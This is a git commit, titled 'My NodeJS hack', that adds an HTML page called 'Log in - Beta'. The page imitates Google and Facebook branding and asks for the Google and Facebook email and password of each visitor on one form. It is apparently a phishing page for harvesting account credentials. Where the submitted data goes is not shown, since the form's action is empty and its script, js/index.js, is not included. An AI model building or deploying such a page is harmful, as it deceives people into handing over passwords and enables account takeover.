ce6b4aaeccdadae689f4bd7d6d71f4d58b64325c
MkMinhTien <60256636+MkMinhTien@users.noreply.github.com>
2020-01-31 17:27:38 +0700

    My NodeJS hack

---
+++ public/server.php
@@ -0,0 +1,74 @@
+<!doctype html>
+<html lang="en">
+
+<head>
+    <title>Log in - Beta</title>
+    <!-- Required meta tags -->
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+    <!-- Bootstrap CSS -->
+    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css"
+        integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
+</head>
+
+<body>
+
+    <center>
+        <h2><b>Sign in to continue</b></h2>
+        <hr><br>
+
+        <form action="">
+
+            <a href="https://www.google.com" target="_blank">
+                <h3>
+                    <google style="color: blue;">G</google><google style="color: red;">o</google><google style="color: yellow;">o</google><google style="color: blue;">g</google><google style="color: green;">l</google><google style="color: red;">e</google>
+                </h3>
+            </a>
+
+            <input type="email" placeholder="    Enter your Google gmail here!" value="@gmail.com" minlength="12"
+                maxlength="30" id="Google-gmail" class="email" name="Google gmail: ">
+            <input type="password" placeholder="Enter your Google password here!" minlength="7" maxlength="30"
+                id="Google-password" class="password" name="Google password: ">
+
+            <br><br>
+
+            <a href="https://www.facebook.com" target="_blank"><h3 style="color: blue;">Facebook</h3></a>
+
+            <input type="email" placeholder="   Enter your email here!" minlength="12" maxlength="23"
+                id="Facebook-email" class="email" name="Facebook email: ">
+            <input type="password" placeholder="Enter your Facebook password here!" minlength="7" maxlength="30"
+                id="Facebook-password" class="password" name="Facebook password: ">
+
+            <br><br><br>
+
+            <div class="g-recaptcha" data-sitekey="6LfocdQUAAAAALJeLiQ2TFPaEMVjoQMIJB8VDVsF"></div>
+
+            <button type="submit">Log in</button>
+
+        </form>
+
+    </center>
+
+    <!-- Optional JavaScript -->
+    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
+    <script src="https://code.jquery.com/jquery-3.3.1.slim.min.js"
+        integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo"
+        crossorigin="anonymous"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.7/umd/popper.min.js"
+        integrity="sha384-UO2eT0CpHqdSJQ6hJty5KVphtPhzWj9WO1clHTMGa3JDZwrnQq4sF86dIHNDz0W1"
+        crossorigin="anonymous"></script>
+    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js"
+        integrity="sha384-JjSmVgyd0p3pXB1rRibZUAYoIIy6OrQ6VrjIEaFf/nJGzIxFDsf4x0xIM+B07jRM"
+        crossorigin="anonymous"></script>
+
+    <!-- JavaScript -->
+    <script src="js/index.js"></script>
+    <script src="https://www.google.com/recaptcha/api.js"></script>
+
+    <!-- Css3 -->
+    <link rel="stylesheet" href="css/index.css">
+
+</body>
+
+</html>
